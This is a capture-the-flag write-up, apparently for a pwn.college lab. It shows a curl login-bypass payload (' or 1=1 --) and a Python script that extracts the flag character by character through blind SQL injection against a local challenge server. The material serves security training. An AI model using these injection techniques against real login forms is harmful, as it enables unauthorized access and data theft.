# SQLi 5

#### Start again by finding the correct login sequence, which appears to allow "' or 1=1 --" again.

'''curl -c cookie -d "username=admin&password="' or 1=1 --" http://challenge.localhost:80```

------------------------------------------------

#### Since this was successful, no need to follow the redirect. In order to get the flag, it has to be pieced together 1 character at a time. To do this, a python script is required.

```python
import requests
import string

url = "http://challenge.localhost:80/"
username = "admin"
password = "' OR 1=1 AND password GLOB 'pwn.college{"
flag = [] # List to hold returned characters
fl = 0 # counter to increase flag index

while True:

  for i in range(33, 127): # Iterate through alphabet, digits and punctuation

    if chr(i) in ["*", "?"]: # Check for after and literal
      continue
    found_char = password + chr(i)
    data = {"username": username, "password": found_char+"*"}
    response = requests.post(url, data=data)

    if response.status_code == 200:
      password = found_char
      flag.insert(fl, chr(i))
      fl += 1

      if chr(i) == "}":
        final_flag = "".join(flag)
        print("pwn.college{" + (''.join(flag)))
        exit(0)
        break
```

--------------------------------------------

#### The script cycles through every character, checking for a return status code of "200". If "200" is returned, then that character is correct and it's added to the flag index. Once the script encounters the closing brackets, it prints the flag and exits.
